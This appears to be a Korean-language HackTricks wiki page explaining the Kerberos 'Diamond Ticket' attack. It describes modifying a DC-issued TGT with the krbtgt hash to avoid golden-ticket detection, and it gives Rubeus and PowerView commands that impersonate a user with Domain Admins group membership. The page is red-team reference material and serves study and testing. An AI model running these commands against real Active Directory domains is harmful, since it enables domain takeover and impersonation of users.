# Diamond Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Diamond Ticket

**황금 티켓처럼**, 다이아몬드 티켓은 **모든 사용자로서 모든 서비스에 접근할 수 있는 TGT**입니다. 황금 티켓은 완전히 오프라인에서 위조되며, 해당 도메인의 krbtgt 해시로 암호화된 후, 사용을 위해 로그온 세션으로 전달됩니다. 도메인 컨트롤러는 TGT를 추적하지 않기 때문에(또는 그들이 정당하게 발급한 TGT를 추적하지 않기 때문에), 그들은 자신의 krbtgt 해시로 암호화된 TGT를 기꺼이 수용합니다.

황금 티켓의 사용을 감지하는 두 가지 일반적인 기술이 있습니다:

* 해당 AS-REQ가 없는 TGS-REQ를 찾습니다.
* Mimikatz의 기본 10년 수명과 같은 어리석은 값을 가진 TGT를 찾습니다.

**다이아몬드 티켓**은 **DC에 의해 발급된 정당한 TGT의 필드를 수정하여 만들어집니다**. 이는 **TGT를 요청하고**, 도메인의 krbtgt 해시로 **복호화한 후**, 티켓의 원하는 필드를 **수정하고**, 다시 **암호화하는** 방식으로 이루어집니다. 이는 다음과 같은 이유로 황금 티켓의 두 가지 단점을 **극복합니다**:

* TGS-REQ는 이전에 AS-REQ가 있을 것입니다.
* TGT는 DC에 의해 발급되었으므로 도메인의 Kerberos 정책에서 모든 올바른 세부정보를 가집니다. 이러한 세부정보는 황금 티켓에서 정확하게 위조할 수 있지만, 더 복잡하고 실수의 여지가 있습니다.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
